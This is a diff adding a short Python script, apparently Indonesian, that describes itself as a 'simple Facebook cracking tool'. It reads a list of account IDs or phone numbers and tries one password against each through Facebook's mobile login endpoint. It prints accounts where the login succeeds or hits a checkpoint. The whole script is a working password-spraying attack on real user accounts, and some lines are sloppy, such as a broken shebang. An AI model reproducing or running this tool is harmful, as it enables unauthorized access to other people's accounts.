@@ -1,0 +1,38 @@
+#!user/bin/sh
+# coding=utf-8
+logo = """ \x1b[1;93m______ \x1b[1;92m_______ \x1b[1;94m______ \x1b[1;91m___ _\n \x1b[1;93m| | \x1b[1;92m| _ |\x1b[1;94m| _ | \x1b[1;91m| | | |\n \x1b[1;93m| _ |\x1b[1;92m| |_| |\x1b[1;94m| | || \x1b[1;91m| |_| |\n \x1b[1;93m| | | |\x1b[1;92m| |\x1b[1;94m| |_||_ \x1b[1;91m| _|\n \x1b[1;93m| |_| |\x1b[1;92m| |\x1b[1;94m| __ |\x1b[1;91m| |_ \n \x1b[1;93m| |\x1b[1;92m| _ |\x1b[1;94m| | | |\x1b[1;91m| _ |\n \x1b[1;93m|______| \x1b[1;92m|__| |__|\x1b[1;94m|___| |_|\x1b[1;91m|___| |_| \x1b[1;96mFB\n\n \x1b[1;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\n ✫╬─ \x1b[1;92mReCode \x1b[1;91m: \x1b[1;93mMr.XXXTRI3WSL \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92mFB \x1b[1;92m \x1b[1;91m: \x1b[1;96mFacebook.com/Wsl Agung Frontal \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92mGitHub \x1b[1;91m: \x1b[1;94mGithub.com/XXXTRI3WSL \x1b[1;95m─╬✫\n ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"""
+import requests
+import sys
+import argparse
+import os
+
+parser = argparse.ArgumentParser(description="tools sederhana crack facebook")
+parser.add_argument("-l", "--list",type=str, help="ID listor phone")
+parser.add_argument("-p", "--password", type=str, help="Password to crack")
+args = parser.parse_args()
+
+jumlah = 0
+
+def main():
+	global jumlah
+	id = args.list
+	pwd = args.password
+	url = "https://m.facebook.com/login.php"
+	list = open(id, "r").readlines()
+	for email in list:
+		email.split()
+		data = {"email":email, "pass":pwd}
+		r = requests.post(url, data=data).url
+		jumlah += 1
+		if "m_sess" in r or "save-device" in r:
+			print("[+] found : %s ~ %s"%(email,pwd))
+			
+		if "checkpoint" in r:
+			print("[*] checkpoint %s ~ %s"%(email,pwd))
+			
+		print("\r[~] crack akun %s|%s"%(jumlah,len(list))),;sys.stdout.flush()
+	
+if args.list == None or args.password == None:
+	os.system("python2 mbf.py -h")
+else:
+    main()
